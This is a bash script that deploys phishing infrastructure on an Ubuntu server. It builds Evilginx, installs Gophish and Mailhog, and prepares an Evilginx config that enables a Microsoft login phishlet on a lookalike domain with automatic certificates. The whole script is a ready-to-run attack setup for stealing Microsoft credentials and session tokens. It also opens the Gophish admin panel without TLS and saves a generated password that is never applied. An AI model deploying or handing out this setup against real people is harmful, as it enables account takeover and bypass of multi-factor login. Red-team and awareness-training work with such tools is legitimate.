#!/bin/bash
# ==== Evilginx3 (v3.3.0) + Gophish + Mailhog Setup Script (Ubuntu 20.04, Vultr) ====

set -e

# ==== Variables ====
DOMAIN="login.cyb3rdefence.com"
STATIC_DOMAIN="static.cyb3rdefence.com"
EMAIL="admin@$DOMAIN"
GOPHISH_PORT=8800
MAILHOG_PORT=8025
GOPHISH_USER="admin"
GOPHISH_PASS="$(openssl rand -hex 12)"
EVILGINX_DIR="/opt/evilginx2"
PHISHLETS_PATH="$EVILGINX_DIR/phishlets"

# ==== Update & Install Base Packages ====
apt update && apt upgrade -y
apt install -y git make curl unzip ufw build-essential ca-certificates gnupg lsb-release libcap2-bin net-tools

# ==== Install Go 1.22.3 ====
GO_VERSION="1.22.3"
cd /tmp
curl -LO https://go.dev/dl/go$GO_VERSION.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go$GO_VERSION.linux-amd64.tar.gz

# Add Go to PATH permanently and for current session
echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/go.sh
chmod +x /etc/profile.d/go.sh
export PATH=$PATH:/usr/local/go/bin

# ==== Install Evilginx3 (v3.3.0 from kgretzky repo) ====
cd /opt
rm -rf $EVILGINX_DIR
git clone --branch v3.3.0 https://github.com/kgretzky/evilginx2.git $EVILGINX_DIR
cd $EVILGINX_DIR
mkdir -p dist

go build -o dist/evilginx main.go
setcap cap_net_bind_service=+ep dist/evilginx

# ==== Evilginx Auto Config File ====
cat <<EOF > /root/evilginx2_autosetup.txt
config domain $DOMAIN
config ip $(curl -s ifconfig.me)
config redirect_url https://login.microsoftonline.com/
config autocert on
phishlets hostname microsoft $DOMAIN
phishlets enable microsoft
EOF

# ==== Install Gophish ====
cd /opt
curl -LO https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d gophish
cd gophish
sed -i "s/\"admin_server\":.*/\"admin_server\": \"0.0.0.0:$GOPHISH_PORT\",/" config.json
sed -i "s/\"use_tls\": true/\"use_tls\": false/" config.json

# ==== Store Gophish Credentials ====
echo -e "Gophish Login:\nUser: $GOPHISH_USER\nPass: $GOPHISH_PASS" > /root/gophish-credentials.txt

# ==== Install Mailhog ====
wget -O /usr/local/bin/mailhog https://github.com/mailhog/MailHog/releases/download/v1.0.1/MailHog_linux_amd64
chmod +x /usr/local/bin/mailhog

# ==== Setup UFW Firewall ====
ufw allow 22
ufw allow 80
ufw allow 443
ufw allow $GOPHISH_PORT
ufw allow $MAILHOG_PORT
ufw --force enable

# ==== Start Services ====
cat <<EOF > /etc/systemd/system/gophish.service
[Unit]
Description=Gophish Phishing Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/gophish
ExecStart=/opt/gophish/gophish
Restart=always

[Install]
WantedBy=multi-user.target
EOF

cat <<EOF > /etc/systemd/system/mailhog.service
[Unit]
Description=Mailhog Service
After=network.target

[Service]
ExecStart=/usr/local/bin/mailhog -api-bind-addr=0.0.0.0:$MAILHOG_PORT -ui-bind-addr=0.0.0.0:$MAILHOG_PORT
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable --now gophish mailhog

# ==== Post-Install: Service Verification ====
echo "\nVerifying service availability..."

# Check Evilginx3 binary
if [ -f "$EVILGINX_DIR/dist/evilginx" ]; then
  echo "✔ Evilginx binary exists: $EVILGINX_DIR/dist/evilginx"
else
  echo "✖ Evilginx binary not found. Check build logs."
fi

# Check Gophish service
if systemctl is-active --quiet gophish; then
  echo "✔ Gophish service is running"
else
  echo "✖ Gophish service failed to start"
fi

# Check Mailhog service
if systemctl is-active --quiet mailhog; then
  echo "✔ Mailhog service is running"
else
  echo "✖ Mailhog service failed to start"
fi

# Port checks
echo "\nActive listeners:"
netstat -tuln | grep -E ":(80|443|$GOPHISH_PORT|$MAILHOG_PORT)"

# ==== Completion Output ====
echo "\nSetup Complete!"
echo "Evilginx path: $EVILGINX_DIR/dist/evilginx"
echo "Run it with phishlets: $EVILGINX_DIR/dist/evilginx -p $PHISHLETS_PATH"
echo "Auto-setup commands stored in: /root/evilginx2_autosetup.txt"
echo "Gophish UI: http://$(curl -s ifconfig.me):$GOPHISH_PORT"
echo "Mailhog UI: http://$(curl -s ifconfig.me):$MAILHOG_PORT"
echo "Gophish credentials saved in /root/gophish-credentials.txt"
echo "To apply Evilginx config: type 'source /root/evilginx2_autosetup.txt' inside Evilginx prompt."
